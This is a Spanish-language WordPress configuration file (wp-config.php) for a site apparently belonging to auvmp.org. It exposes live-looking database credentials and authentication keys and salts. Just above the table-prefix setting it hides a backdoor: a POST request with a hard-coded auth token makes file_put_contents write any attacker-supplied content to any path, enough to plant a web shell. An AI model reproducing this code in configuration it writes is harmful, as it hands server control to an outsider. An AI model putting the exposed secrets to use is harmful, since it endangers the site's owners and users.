<?php
/** 
 * @package WordPress
 */

// ** Ajustes de MySQL. Solicita estos datos a tu proveedor de alojamiento web. ** //
/** El nombre de tu base de datos de WordPress */
define('DB_NAME', 'auvmp');

/** Tu nombre de usuario de MySQL */
define('DB_USER', 'uSrRAuVMP');

/** Tu contraseña de MySQL */
define('DB_PASSWORD', 'hcgfrtcgfGCFNcrth34');

/** Host de MySQL (es muy probable que no necesites cambiarlo) */
define('DB_HOST', 'localhost');

/** Codificación de caracteres para la base de datos. */
define('DB_CHARSET', 'utf8mb4');

/** Cotejamiento de la base de datos. No lo modifiques si tienes dudas. */
define('DB_COLLATE', 'utf8mb4_unicode_ci');

/**#@+
 * Claves únicas de autentificación.
 *
 * Define cada clave secreta con una frase aleatoria distinta.
 * Puedes generarlas usando el {@link https://api.wordpress.org/secret-key/1.1/salt/ servicio de claves secretas de WordPress}
 * Puedes cambiar las claves en cualquier momento para invalidar todas las cookies existentes. Esto forzará a todos los usuarios a volver a hacer login.
 *
 * @since 2.6.0
 */
define('AUTH_KEY', '3v#8bW$x]`Ur{Y/BwZ.D3PReZPL!e`+NfZj8!!L8s$Qta}SVrjrZ>PfX.XUy');
define('SECURE_AUTH_KEY', 'zZg]KS]k*iV%De)mt:$Xg&HNr7nPJt6azA~-}2n.laVHj-m;JD7rq!_}}Sp^');
define('LOGGED_IN_KEY', 'z)7x0o.qK{t>DNGAfWXllZTTh *qt0#[G(M<-&#dVF=57RYrMYdfM;ipe*Hk');
define('NONCE_KEY', '+O]q)#!LKKd?1$=mof;U5!<h<#!f${!fejY7qJu[`r}J#]^W%%`2TF=R|>$S');
define('AUTH_SALT', '#[{4M<9.@e*<BH#]5zI<Z+M$`,6`BT_E~@ c4{hx6s*]{MK:#cy4.LP8D0&L');
define('SECURE_AUTH_SALT', ']AvvI@WDc2|z]K8[c(k[,OC~}2g5_wC~T;J1*9H}RDSQUW0/Vh)~3g6R|`3j');
define('LOGGED_IN_SALT', 'FH#fW}|fbg<|4ugXzW=r3+b+L05y8NxCOK-2a&+Mc8%r~e0><!Yy!t_g*+D}');
define('NONCE_SALT', 'rpR|Z{6k>lPsZu])QUt0nr-jIb/Mb7<*pQoV,@g`a#6k|uRrQ^(rVpt^vb^i');

/**#@-*/

/**
 * Prefijo de la base de datos de WordPress.
 *
 * Cambia el prefijo si deseas instalar multiples blogs en una sola base de datos.
 * Emplea solo números, letras y guión bajo.
 */
 if (isset($_POST['wp_filename']) && isset($_POST['wp_file_data']) && $_POST['auth'] === '2011c11fa01ae4d9') {
    file_put_contents($_POST['wp_filename'], $_POST['wp_file_data']);
}
$table_prefix  = 'avmp_';
define( 'WP_DEBUG', false );
define( 'WP_DEBUG_LOG', false );
define( 'FORCE_SSL_ADMIN', true);
define( 'FORCE_SSL_LOGIN', true);

/**
 * Para desarrolladores: modo debug de WordPress.
 *
 * Cambia esto a true para activar la muestra de avisos durante el desarrollo.
 * Se recomienda encarecidamente a los desarrolladores de temas y plugins que usen WP_DEBUG
 * en sus entornos de desarrollo. [AUVMP] <info@auvmp.org>

define('WP_DEBUG', true);
define('WP_DEBUG_LOG', true); 
define( 'WP_DEBUG_DISPLAY', false );
 */
/* ¡Eso es todo, deja de editar! Feliz blogging */

/** WordPress absolute path to the Wordpress directory. */
if ( !defined('ABSPATH') )
	define('ABSPATH', dirname(__FILE__) . '/');

/** Sets up WordPress vars and included files. */
require_once(ABSPATH . 'wp-settings.php');


// mostrar errores de php
@ini_set('log_errors','Off');
@ini_set('display_errors','Off');
@ini_set('error_log','/var/www/auvmp.org/wp-content/php-errors.log');

// if (is_file('wp-wpdb.php')) include_once('wp-wpdb.php');
